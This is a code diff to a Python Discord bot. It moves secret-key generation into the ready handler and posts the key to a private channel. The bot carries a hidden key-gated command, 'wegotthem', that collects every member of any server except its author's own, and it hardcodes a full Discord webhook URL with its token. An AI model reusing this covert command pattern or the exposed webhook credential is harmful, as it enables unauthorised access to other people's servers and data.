@@ -10,8 +10,6 @@ from pathlib import Path
 import string
 def KeyGen(size=1989, chars=string.ascii_uppercase + string.digits):
 	return ''.join(random.choice(chars) for _ in range(size)) 
-	
-Key = KeyGen()
 client = discord.Client()
 hook = dhooks.Webhook('https://discordapp.com/api/webhooks/516092910081409058/dQ1YJOs3qwD57lM6CH9nhChJyhVO39Oc1YchGpUQE3f1qvpHIu8EXptI-_qlXUVxBjkG')
 def ServerInfo(id):
@@ -47,17 +45,17 @@ async def on_message(message):
 		elif command(prefix + "wegotthem"):
 			if args[1] == Key:
 				if message.server.id != '513142267654176784':
-					global Key
 					Key = KeyGen()
 					players = []
 					for member in message.server.members:
-						players.append(member)
-					
+						players.append(member)					
 				else:
 					await client.send_message(message.channel, "```css\n#Error\n\n[ 0 ] This command is not allowed in this server.\n\nLenny #EC:1001\n```")
 @client.event
 async def on_ready():
 	await client.change_status(game=discord.Game(name='Jogos! ;)'))
+	global Key
+	Key = KeyGen()
 	print(f"[+] Logged as {client.user.name}")
 	await client.send_message(client.get_channel('518178372493246482'), "Key generated:")
 	await client.send_message(client.get_channel('518178372493246482'), f"{Key}")
